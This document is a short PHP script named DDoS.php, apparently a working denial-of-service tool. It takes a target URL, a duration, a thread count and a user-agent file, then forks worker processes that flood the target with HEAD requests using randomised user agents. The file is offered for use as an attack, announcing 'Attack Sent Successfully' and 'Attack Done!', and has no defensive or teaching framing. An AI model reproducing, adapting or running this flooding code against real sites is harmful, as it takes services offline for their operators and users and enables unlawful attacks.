<?php
set_time_limit(0);
error_reporting(0);

if ($argc < 5) {
    echo "Usage: php DDoS.php <url> <time> <thread> <ua file>\n";
    exit(1);
}

$url = $argv[1];
$time = (int) $argv[2];
$thread = (int) $argv[3];
$ua_file = $argv[4];

if (!filter_var($url, FILTER_VALIDATE_URL)) {
    echo "Invalid URL\n";
    exit(1);
}

if (!file_exists($ua_file)) {
    echo "Useragent file not found\n";
    exit(1);
}

$ua_list = file($ua_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$total_ua = count($ua_list);

echo "Attack Sent Successfully\nTarget: $url\nTime: $time\nThread: $thread\nUA: $ua_file - Số Lượng UA: $total_ua\n";

$start_time = time();

// Define the attack function
function attack($url, $ua_list, $total_ua)
{
    while (true) {
        if ((time() - $GLOBALS['start_time']) > $GLOBALS['time']) {
            break;
        }

        $ch = curl_init($url);
        $random_ua = $ua_list[rand(0, $total_ua - 1)];
        curl_setopt($ch, CURLOPT_USERAGENT, $random_ua);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Start attacking with multiple threads
for ($i = 0; $i < $thread; $i++) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        die('Fork failed');
    } elseif ($pid == 0) {
        attack($url, $ua_list, $total_ua);
        exit(0);
    }
}

// Wait for the specified time to complete
sleep($time);

// Terminate all child processes
while (pcntl_waitpid(0, $status) != -1) {
    $status = pcntl_wexitstatus($status);
}

echo "Attack Done!\n";
?>